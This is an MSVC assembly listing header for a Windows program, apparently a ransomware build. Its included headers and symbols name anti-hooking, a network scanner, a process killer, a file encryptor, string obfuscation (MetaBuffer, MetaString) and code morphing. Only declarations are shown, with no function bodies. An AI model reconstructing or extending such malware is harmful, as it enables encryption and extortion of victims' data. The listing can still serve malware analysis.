; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?g_NoMutex@@3HA					; g_NoMutex
_BSS	SEGMENT
?g_NoMutex@@3HA DD 01H DUP (?)				; g_NoMutex
_BSS	ENDS
msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__48BF11AE_antihooks@h DB 01H
__6A2859B8_global_parameters@h DB 01H
__016BD130_queue@h DB 01H
__ED66B863_memory@h DB 01H
__93890D6E_filesystem@h DB 01H
__8070D656_threadpool@h DB 01H
__24398185_network_scanner@h DB 01H
__457AF2B3_logs@h DB 01H
__62742911_prockiller@h DB 01H
__636D4263_ecrypt-config@h DB 01H
__B6C0B8F2_ecrypt-machine@h DB 01H
__94D60663_ecrypt-portable@h DB 01H
__80D1E77F_ecrypt-sync@h DB 01H
__712596B7_cryptor@h DB 01H
__899FCD3C_mrph@h DB 01H
__18E689E6_main@cpp DB 01H
msvcjmc	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	WinMain
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Orphan_all@_Container_base0@std@@QEAAXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	?plstrlenW@@YAHPEB_W@Z				; plstrlenW
PUBLIC	?pWaitForSingleObject@@YAKPEAXK@Z		; pWaitForSingleObject
PUBLIC	?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z	; pGetNativeSystemInfo
PUBLIC	?pGetCommandLineW@@YAPEA_WXZ			; pGetCommandLineW
PUBLIC	?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z ; pCreateMutexA
PUBLIC	?plstrcmpiW@@YAHPEB_W0@Z			; plstrcmpiW
PUBLIC	?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z	; pCommandLineToArgvW
PUBLIC	?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z ; pWideCharToMultiByte
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	?morphcode@@YAXH@Z				; morphcode
PUBLIC	?morphcode@@YAXPEAX@Z				; morphcode
PUBLIC	?morphcode@@YAXXZ				; morphcode
PUBLIC	?SToI@@YAHPEAD@Z				; SToI
PUBLIC	?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z	; GetCommandLineArg
PUBLIC	?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z	; FindCommandLineArg
PUBLIC	?ConvertSizeStr@@YAHPEA_W@Z			; ConvertSizeStr
PUBLIC	?HandleCommandLine@@YAHPEA_W@Z			; HandleCommandLine
PUBLIC	??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<2,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
